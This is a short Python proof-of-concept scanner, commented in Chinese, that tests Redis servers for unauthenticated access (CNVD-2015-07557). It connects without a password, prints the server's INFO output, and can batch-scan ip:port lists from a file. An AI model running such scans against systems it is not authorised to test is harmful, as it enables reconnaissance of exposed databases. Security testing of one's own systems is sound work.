'''
Author: twsec
Date: 2023-01-06 14:59:24
LastEditors: twsec
LastEditTime: 2023-01-06 16:26:38
Description: redis未授权访问漏洞-POC
'''
import redis
import getopt
import sys

def usage():
    #生成一个图案
    print(''' 


████████╗██╗    ██╗███████╗███████╗ ██████╗
╚══██╔══╝██║    ██║██╔════╝██╔════╝██╔════╝
   ██║   ██║ █╗ ██║███████╗█████╗  ██║     
   ██║   ██║███╗██║╚════██║██╔══╝  ██║     
   ██║   ╚███╔███╔╝███████║███████╗╚██████╗
   ╚═╝    ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝
                                           

python3 CNVD-2015-07557-POC.py -t ip -p port / -f file
-t ip: 目标地址
-p port: 目标端口
-f file: 批量检测
-h help: 帮助
想念你的时候，我会用你的名字喊醒自己。
''')


def check(target,port):
    #检测redis未授权访问漏洞
    
    try:
        #建立redis连接
        r = redis.Redis(host=target, port=port, db=0, socket_timeout=3, socket_connect_timeout=3, password=None, encoding='utf-8', encoding_errors='strict', charset=None, errors=None, unix_socket_path=None)
        #获取redis info信息

        info = r.info()
        if info:
            print(info)
            #换行
            print('+++++++++++++++++++++++++++++++++++++ ')
            print(target + '存在redis未授权访问漏洞！')
            print('+++++++++++++++++++++++++++++++++++++ ')
            
            
            


        else:
            print('+++++++++++++++++++++++++++++++++++++ ')
            print(target + '不存在redis未授权访问漏洞！')
            print('+++++++++++++++++++++++++++++++++++++ ')
    except:
        print("请求出错"+target + '可能不存在redis未授权访问漏洞！')



        

        

    
    
#main函数

if __name__ == '__main__':
    usage()
    try:
        #如果用户没有输入参数则打印帮助信息
        if len(sys.argv) == 1:
            print('python3 CNVD-2015-07557-POC.py -t ip -p port / -f file')
            sys.exit()
        #如果用户输入-h或者--help则打印帮助信息
        if sys.argv[1] == '-h' or sys.argv[1] == '--help':
            print('python3 CNVD-2015-07557-POC.py -t ip -p port / -f file')
            sys.exit()
        #如果用户输入-t并且输入-p则执行检测
        if sys.argv[1] == '-t' and sys.argv[3] == '-p':
            target = sys.argv[2]
            port = sys.argv[4]
        
            check(target,port)
            sys.exit()
        
        #如果用户输入-f则执行批量检测
        if sys.argv[1] == '-f':
            file = sys.argv[2]
            f = open(file, 'r')
            for i in f.readlines():
                #以分号分割ip和端口，同时去掉空格，分别赋值给target和port


                target = i.split(':')[0].strip()
                port = i.split(':')[1].strip()
            
    
                check(target,port)
            f.close()
            sys.exit()
        #opts, args = getopt.getopt(sys.argv[2: ], "ht:p:f:")
    except getopt.GetoptError:
        print('python3 CNVD-2015-07557-POC.py -t ip -p port / -f file')
        sys.exit(2)
        










    

            
        

